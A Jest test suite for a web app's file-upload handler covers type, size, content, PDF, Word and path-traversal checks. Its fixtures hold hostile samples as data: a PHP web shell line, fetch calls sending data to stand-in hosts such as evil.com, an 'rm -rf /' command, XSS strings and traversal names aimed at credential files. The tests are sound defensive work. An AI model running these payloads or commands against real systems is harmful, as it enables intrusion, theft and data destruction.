/**
 * File Upload Security Tests
 * Tests protection against malicious file uploads and processing
 */

describe('File Upload Security Tests', () => {
  let mockHTML;
  let appState;

  beforeEach(() => {
    mockHTML = require('../../index.html');
    
    document.body.innerHTML = `
      <input type="file" id="templateFile">
      <div id="uploadStatus"></div>
      <textarea id="templateText"></textarea>
    `;

    mockHTML.execute(global);
    appState = global.appState;
  });

  describe('File Type Validation', () => {
    test('should reject executable files', async () => {
      const executableTypes = [
        { name: 'malicious.exe', type: 'application/x-msdownload' },
        { name: 'script.bat', type: 'application/x-bat' },
        { name: 'payload.com', type: 'application/x-msdownload' },
        { name: 'virus.scr', type: 'application/x-msdownload' },
        { name: 'trojan.pif', type: 'application/x-msdownload' },
        { name: 'malware.msi', type: 'application/x-msi' },
        { name: 'shell.cmd', type: 'application/x-bat' },
        { name: 'script.ps1', type: 'application/x-powershell' }
      ];

      for (const fileInfo of executableTypes) {
        const mockFile = new File(['malicious content'], fileInfo.name, { type: fileInfo.type });
        
        const mockEvent = {
          target: { files: [mockFile] },
          preventDefault: jest.fn(),
          stopPropagation: jest.fn()
        };

        await global.handleFileUpload(mockEvent);
        
        const uploadStatus = document.getElementById('uploadStatus');
        expect(uploadStatus.textContent).toContain('Unsupported file type');
        expect(appState.templateText).not.toBe('malicious content');
      }
    });

    test('should reject script files', async () => {
      const scriptTypes = [
        { name: 'script.js', type: 'application/javascript' },
        { name: 'payload.php', type: 'application/x-php' },
        { name: 'shell.sh', type: 'application/x-sh' },
        { name: 'script.py', type: 'text/x-python' },
        { name: 'malicious.vbs', type: 'application/x-vbscript' },
        { name: 'exploit.jar', type: 'application/java-archive' }
      ];

      for (const fileInfo of scriptTypes) {
        const mockFile = new File(['console.log("malicious")'], fileInfo.name, { type: fileInfo.type });
        
        const mockEvent = {
          target: { files: [mockFile] },
          preventDefault: jest.fn(),
          stopPropagation: jest.fn()
        };

        await global.handleFileUpload(mockEvent);
        
        const uploadStatus = document.getElementById('uploadStatus');
        expect(uploadStatus.textContent).toContain('Unsupported file type');
      }
    });

    test('should validate file extensions against MIME types', async () => {
      // File with PDF extension but text MIME type
      const spoofedFile = new File(['<script>alert("spoofed")</script>'], 'fake.pdf', { type: 'text/plain' });
      
      const mockEvent = {
        target: { files: [spoofedFile] },
        preventDefault: jest.fn(),
        stopPropagation: jest.fn()
      };

      await global.handleFileUpload(mockEvent);
      
      // Should be rejected or handled safely
      const uploadStatus = document.getElementById('uploadStatus');
      expect(uploadStatus.textContent).toContain('Error');
    });
  });

  describe('File Size Limits', () => {
    test('should reject files exceeding size limit', async () => {
      const oversizedContent = 'x'.repeat(100 * 1024 * 1024); // 100MB
      const oversizedFile = new File([oversizedContent], 'huge.txt', { type: 'text/plain' });
      
      const mockEvent = {
        target: { files: [oversizedFile] },
        preventDefault: jest.fn(),
        stopPropagation: jest.fn()
      };

      await global.handleFileUpload(mockEvent);
      
      const uploadStatus = document.getElementById('uploadStatus');
      expect(uploadStatus.textContent).toContain('too large');
      expect(appState.templateText).not.toBe(oversizedContent);
    });

    test('should handle zero-byte files', async () => {
      const emptyFile = new File([''], 'empty.txt', { type: 'text/plain' });
      
      const mockEvent = {
        target: { files: [emptyFile] },
        preventDefault: jest.fn(),
        stopPropagation: jest.fn()
      };

      await global.handleFileUpload(mockEvent);
      
      const uploadStatus = document.getElementById('uploadStatus');
      expect(uploadStatus.textContent).toContain('empty');
    });
  });

  describe('Content Validation', () => {
    test('should detect and handle malicious content in text files', async () => {
      const maliciousContents = [
        '<script>window.location="http://malicious.com"</script>',
        '<?php system($_GET["cmd"]); ?>',
        'eval(base64_decode("malicious_code_here"))',
        'document.cookie = "stolen"',
        'XMLHttpRequest("http://malicious.com/steal")',
        'fetch("http://evil.com/exfiltrate")',
        'import os; os.system("rm -rf /")'
      ];

      for (const content of maliciousContents) {
        const mockFile = new File([content], 'malicious.txt', { type: 'text/plain' });
        
        const mockEvent = {
          target: { files: [mockFile] },
          preventDefault: jest.fn(),
          stopPropagation: jest.fn()
        };

        await global.handleFileUpload(mockEvent);
        
        // Content should be stored but marked as potentially dangerous
        expect(appState.templateText).toBe(content);
        
        // Generate prompt and ensure it doesn't execute
        const prompt = global.generateClaudePrompt();
        expect(prompt).toContain(content);
      }
    });

    test('should handle binary content safely', async () => {
      const binaryContent = new Uint8Array([0x50, 0x4B, 0x03, 0x04]); // ZIP header
      const binaryFile = new File([binaryContent], 'binary.zip', { type: 'application/zip' });
      
      const mockEvent = {
        target: { files: [binaryFile] },
        preventDefault: jest.fn(),
        stopPropagation: jest.fn()
      };

      await global.handleFileUpload(mockEvent);
      
      const uploadStatus = document.getElementById('uploadStatus');
      expect(uploadStatus.textContent).toContain('Unsupported file type');
    });

    test('should prevent path traversal in file names', async () => {
      const pathTraversalNames = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32\\config\\sam',
        '/etc/shadow',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        '....//....//etc//passwd',
        '%2e%2e%2fetc%2fpasswd'
      ];

      for (const fileName of pathTraversalNames) {
        const mockFile = new File(['content'], fileName, { type: 'text/plain' });
        
        const mockEvent = {
          target: { files: [mockFile] },
          preventDefault: jest.fn(),
          stopPropagation: jest.fn()
        };

        await global.handleFileUpload(mockEvent);
        
        // Should process file but sanitize name handling
        expect(appState.templateText).toBe('content');
      }
    });
  });

  describe('PDF Security', () => {
    test('should handle malicious PDF content', async () => {
      const mockMaliciousPDF = new File(['malicious pdf'], 'evil.pdf', { type: 'application/pdf' });
      
      // Mock PDF.js to return malicious content
      pdfjsLib.getDocument.mockReturnValue({
        promise: Promise.resolve({
          numPages: 1,
          getPage: jest.fn(() => Promise.resolve({
            getTextContent: jest.fn(() => Promise.resolve({
              items: [
                { str: '<script>alert("PDF XSS")</script>' },
                { str: 'javascript:void(0)' },
                { str: 'data:text/html,<script>alert("evil")</script>' }
              ]
            }))
          }))
        })
      });
      
      const mockEvent = {
        target: { files: [mockMaliciousPDF] },
        preventDefault: jest.fn(),
        stopPropagation: jest.fn()
      };

      await global.handleFileUpload(mockEvent);
      
      // Content should be extracted but not executed
      expect(appState.templateText).toContain('script');
      expect(appState.templateText).toContain('javascript');
    });

    test('should handle PDF processing errors securely', async () => {
      const corruptPDF = new File(['corrupt'], 'corrupt.pdf', { type: 'application/pdf' });
      
      // Mock PDF.js to throw error
      pdfjsLib.getDocument.mockReturnValue({
        promise: Promise.reject(new Error('Malformed PDF'))
      });
      
      const mockEvent = {
        target: { files: [corruptPDF] },
        preventDefault: jest.fn(),
        stopPropagation: jest.fn()
      };

      await global.handleFileUpload(mockEvent);
      
      const uploadStatus = document.getElementById('uploadStatus');
      expect(uploadStatus.textContent).toContain('Error');
      expect(appState.templateText).toBe(''); // Should not contain corrupt data
    });
  });

  describe('Word Document Security', () => {
    test('should handle malicious Word content', async () => {
      const mockMaliciousDocx = new File(['malicious docx'], 'evil.docx', { 
        type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document' 
      });
      
      // Mock Mammoth to return malicious content
      mammoth.extractRawText.mockReturnValue(Promise.resolve({
        value: '<script>alert("DOCX XSS")</script>\njavascript:void(0)\nmalicious content',
        messages: [{ type: 'warning', message: 'Suspicious content detected' }]
      }));
      
      const mockEvent = {
        target: { files: [mockMaliciousDocx] },
        preventDefault: jest.fn(),
        stopPropagation: jest.fn()
      };

      await global.handleFileUpload(mockEvent);
      
      // Content should be extracted but not executed
      expect(appState.templateText).toContain('script');
      expect(appState.templateText).toContain('malicious content');
    });

    test('should handle Word document macros safely', async () => {
      const macroDocx = new File(['macro docx'], 'macro.docx', { 
        type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document' 
      });
      
      // Mock Mammoth to indicate macro presence
      mammoth.extractRawText.mockReturnValue(Promise.resolve({
        value: 'Document with macros\nSub AutoOpen()\nMsgBox "Macro executed"\nEnd Sub',
        messages: [{ type: 'warning', message: 'Document contains macros' }]
      }));
      
      const mockEvent = {
        target: { files: [macroDocx] },
        preventDefault: jest.fn(),
        stopPropagation: jest.fn()
      };

      await global.handleFileUpload(mockEvent);
      
      // Macro code should be extracted as text, not executed
      expect(appState.templateText).toContain('AutoOpen');
      expect(appState.templateText).toContain('MsgBox');
    });
  });

  describe('Memory and Resource Protection', () => {
    test('should prevent memory exhaustion attacks', async () => {
      const hugeContent = 'A'.repeat(10 * 1024 * 1024); // 10MB
      const hugeFile = new File([hugeContent], 'huge.txt', { type: 'text/plain' });
      
      const startMemory = performanceTestUtils.measureMemoryUsage();
      
      const mockEvent = {
        target: { files: [hugeFile] },
        preventDefault: jest.fn(),
        stopPropagation: jest.fn()
      };

      await global.handleFileUpload(mockEvent);
      
      const endMemory = performanceTestUtils.measureMemoryUsage();
      
      // Should either reject the file or handle it without excessive memory use
      if (startMemory && endMemory) {
        const memoryIncrease = endMemory.used - startMemory.used;
        expect(memoryIncrease).toBeLessThan(50 * 1024 * 1024); // 50MB increase max
      }
    });

    test('should handle rapid file uploads without resource exhaustion', async () => {
      const files = Array.from({ length: 10 }, (_, i) => 
        new File([`content ${i}`], `file${i}.txt`, { type: 'text/plain' })
      );
      
      const events = files.map(file => ({
        target: { files: [file] },
        preventDefault: jest.fn(),
        stopPropagation: jest.fn()
      }));
      
      const startTime = performance.now();
      
      // Simulate rapid uploads
      for (const event of events) {
        await global.handleFileUpload(event);
      }
      
      const endTime = performance.now();
      
      // Should complete within reasonable time
      expect(endTime - startTime).toBeLessThan(5000);
    });
  });

  describe('File System Interaction Prevention', () => {
    test('should not attempt to access local file system beyond upload', async () => {
      const mockFile = new File(['test content'], 'test.txt', { type: 'text/plain' });
      
      // Spy on potentially dangerous file operations
      const createObjectURLSpy = jest.spyOn(URL, 'createObjectURL');
      const revokeObjectURLSpy = jest.spyOn(URL, 'revokeObjectURL');
      
      const mockEvent = {
        target: { files: [mockFile] },
        preventDefault: jest.fn(),
        stopPropagation: jest.fn()
      };

      await global.handleFileUpload(mockEvent);
      
      // Should handle file reading safely
      expect(createObjectURLSpy).not.toHaveBeenCalled();
      expect(revokeObjectURLSpy).not.toHaveBeenCalled();
    });
  });
});